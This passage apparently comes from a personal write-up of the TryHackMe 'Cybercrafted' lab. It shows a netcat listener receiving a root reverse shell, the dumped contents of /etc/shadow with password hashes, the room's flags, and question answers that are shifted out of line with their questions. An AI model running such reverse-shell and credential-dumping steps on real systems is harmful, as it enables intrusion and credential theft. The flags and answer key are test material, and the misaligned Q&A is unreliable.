+[22:38:47 INFO]: rm: cannot remove '/tmp/f': No such file or directory
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvnp 1338
+listening on [any] 1338 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.root@cybercrafted:/opt/minecraft/cybercrafted# whoami
+whoami
+root@cybercrafted:/opt/minecraft/cybercrafted# cd /root
+cd /root
+root@cybercrafted:~# ls
+ls
+root.txt
+root@cybercrafted:~# cat root.txt
+cat root.txt
+THM{8bb1eda065ceefb5795a245568350a70}
+root@cybercrafted:~# cat /etc/shadow
+cat /etc/shadow
+root:*:18480:0:99999:7:::
+daemon:*:18480:0:99999:7:::
+bin:*:18480:0:99999:7:::
+sys:*:18480:0:99999:7:::
+sync:*:18480:0:99999:7:::
+games:*:18480:0:99999:7:::
+man:*:18480:0:99999:7:::
+lp:*:18480:0:99999:7:::
+mail:*:18480:0:99999:7:::
+news:*:18480:0:99999:7:::
+uucp:*:18480:0:99999:7:::
+proxy:*:18480:0:99999:7:::
+www-data:*:18480:0:99999:7:::
+backup:*:18480:0:99999:7:::
+list:*:18480:0:99999:7:::
+irc:*:18480:0:99999:7:::
+gnats:*:18480:0:99999:7:::
+nobody:*:18480:0:99999:7:::
+systemd-network:*:18480:0:99999:7:::
+systemd-resolve:*:18480:0:99999:7:::
+syslog:*:18480:0:99999:7:::
+messagebus:*:18480:0:99999:7:::
+_apt:*:18480:0:99999:7:::
+lxd:*:18480:0:99999:7:::
+uuidd:*:18480:0:99999:7:::
+dnsmasq:*:18480:0:99999:7:::
+landscape:*:18480:0:99999:7:::
+pollinate:*:18480:0:99999:7:::
+sshd:*:18804:0:99999:7:::
+mysql:!:18804:0:99999:7:::
+xxultimatecreeperxx:$6$YVPtRid3$yHsAoVRdkH7V0onPbefgRPeyj1xrBNxnzyZKIopigxaMB088YDW/4UkLIQ4A9ivEQwcMVkGhRhA2.u8GeyZiD.:18805:0:99999:7:::
+cybercrafted:$6$F6ChzVlS$O4FKDNkV0xyfhBelxIU68Lo3GCyA9RHWt8OgpYixA8nWacYynElKj9BiQ0vLIIi.r3FP3Z37nR5gaDHdSbVrF/:18805:0:99999:7:::
+```
+![[Pasted image 20230308121024.png]]
+![[Pasted image 20230308121423.png]]
+![[Pasted image 20230308125628.png]]
+![[Pasted image 20230308125751.png]]
+![[Pasted image 20230308131807.png]]
+How many ports are open?
+Correct Answer
+What service runs on the highest port?
+*3*
+Any subdomains? (Alphabetical order)
+*Minecraft*
+On what page did you find the vulnerability?
+*admin store www*
+What is the admin's username? (Case-sensitive)
+*xXUltimateCreeperXx*
+What is the web flag?
+Can you get the Minecraft server flag?
+What is the name of the sketchy plugin?
+*LoginSystem*
+What is the user's flag?
+Finish the job and give me the root flag!
+### The End
+﻿And there you have it! This was "**Cybercrafted**" by [madrinch](https://tryhackme.com/p/madrinch).
+Check me out on: [Twitter](https://twitter.com/madr1nch)!
+Answer the questions below
+Good luck on your future adventures!
+Question Done
+
+## Flags / Answers
+- ***THM{bbe315906038c3a62d9b195001f75008}***
+- ***THM{ba93767ae3db9f5b8399680040a0c99e}***
+- ***THM{b4aa20aaf08f174473ab0325b24a45ca}***
+- ***THM{8bb1eda065ceefb5795a245568350a70}***
+
+## Notes / Lessons Learned
+[[LocalPotato]]
+
